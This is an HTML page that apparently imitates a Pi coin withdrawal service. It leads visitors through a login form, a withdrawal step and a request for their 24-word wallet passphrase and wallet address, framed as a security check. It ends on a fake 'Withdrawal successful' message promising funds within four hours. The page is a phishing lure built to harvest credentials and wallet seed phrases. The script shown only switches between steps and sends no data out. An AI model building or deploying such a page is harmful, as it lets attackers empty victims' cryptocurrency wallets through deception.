<head></head>
 <body>
   &gt; 
  <meta charset="UTF-8"> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
  <title>Withdrawal Login</title> 
  <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 300px;
        }
        .container img {
            width: 100px;
            height: 100px;
        }
        .container p {
            color: rgb(21, 7, 7);
            font-size: 12px;
            margin: 10px 0;
        }
        .container input[type="text"], .container input[type="password"] {
            width: calc(100% - 20px);
            padding: 8px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        .container button {
            background-color: purple;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
        }
        .container button:hover {
            background-color: #5a2d82;
        }
        .step {
            display: none;
        }
        .step.active {
            display: block;
        }
        .small-text {
            font-size: 10px;
            color: gray;
        }
        .bold-text {
            font-weight: bold;
            margin: 20px 0;
        }
        .select-payment {
            width: calc(100% - 20px);
            padding: 8px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            display: block;
            background-color: white;
        }
        .animate {
            display: none;
        }
        .animate.active {
            display: block;
            animation: fadeIn 2s;
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        .success {
            color: green;
            font-size: 14px;
        }
    </style> 
  <div class="container" id="login-step"> 
   <img src="data:image/png;base64,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" alt="Logo"> 
   <p>For withdrawal coins you need to login app</p> 
   <input type="text" placeholder="User name" id="username"> 
   <input type="password" placeholder="Password" id="password"> <button onclick="showStep('withdrawal-step')">Login</button> 
  </div> 
  <div class="container step" id="withdrawal-step"> 
   <p class="bold-text">Withdrawal pi coins</p> 
   <input type="text" placeholder="Amount"> <select class="select-payment"> <option>PayPal</option> <option>Crypto currency</option> </select> <button onclick="showStep('passphrase-step')">Proceed</button> 
   <p class="small-text">Your withdrawal one step away</p> 
  </div> 
  <div class="container step" id="passphrase-step"> 
   <p class="bold-text">Put your passphrase that you're really who is trying to withdrawal funds. It's for your security</p> 
   <input type="text" placeholder="wallet Passphrase (24 characters )" style="opacity: 0.5;"> 
   <input type="text" placeholder="wallet Address (USDT, BTC, ETH)" style="opacity: 0.5;"> 
   <p class="small-text">Only BEP 20 network supported</p> <button onclick="showSuccess()">Withdrawal</button> 
  </div> 
  <div class="container animate" id="success-step"> <button class="success">✅ Withdrawal successful</button> 
   <p class="small-text">You will receive amount within 4 hours</p> 
  </div> 
  <script>
        function showStep(stepId) {
            document.querySelectorAll('.step, #login-step').forEach(step => step.classList.remove('active'));
            document.getElementById(stepId).classList.add('active');
        }

        function showSuccess() {
            document.querySelectorAll('.step, #login-step').forEach(step => step.classList.remove('active'));
            document.getElementById('success-step').classList.add('active');
        }
    </script> 
 </body>
</html>
 
